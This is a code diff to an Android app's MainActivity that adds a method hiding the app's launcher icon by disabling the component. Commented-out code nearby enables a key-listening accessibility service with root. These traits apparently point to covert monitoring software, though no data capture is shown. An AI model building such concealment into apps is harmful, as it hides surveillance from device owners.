@@ -1,6 +1,6 @@
 package com.example.msphone;
 
-
+import android.content.ComponentName;
 import android.Manifest;
 import android.app.AppOpsManager;
 import android.content.Context;
@@ -631,19 +631,44 @@ public class MainActivity extends AppCompatActivity {
             finish();
             System.exit(0);
         }
+
         startFloatingWindowService();
 
 //        // 1. 检查无障碍服务是否已开启
-//        if (!isAccessibilityServiceEnabled(this, KeyListenService.class)) {
 //            // 如果未开启，尝试使用Root权限开启
+//        if (!isAccessibilityServiceEnabled(this, KeyListenService.class)) {
 //            enableAccessibilityServiceWithRoot();
+//        }
+
+//        SharedPreferences prefs = getSharedPreferences("app_settings", MODE_PRIVATE);
+//        boolean isIconHidden = prefs.getBoolean("icon_hidden", false);
+//        if (isIconHidden) {
+//            hideAppIcon();
 //        }
         finish();
 
         // 启动Runnable任务
 //        handler.postDelayed(runnableCode, 120000);
     }
+    // 隐藏图标的核心代码
+    private void hideAppIcon() {
+        // 1. 获取 PackageManager
+        PackageManager pm = getPackageManager();
+        // 2. 创建要禁用的组件的名称，指向我们的 MainActivity
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        // 3. 禁用这个组件
+        pm.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+        );
 
+        // 4. 用 SharedPreferences 记录下来，我们已经隐藏了图标
+        SharedPreferences prefs = getSharedPreferences("app_settings", MODE_PRIVATE);
+        prefs.edit().putBoolean("icon_hidden", true).apply();
+
+//        Toast.makeText(this, "图标已隐藏，下次重启手机后生效", Toast.LENGTH_LONG).show();
+    }
 //    // 您 MainActivity 中的这个方法
 //    private void enableAccessibilityServiceWithRoot() {
 //        // 拼接我们服务的完整组件名
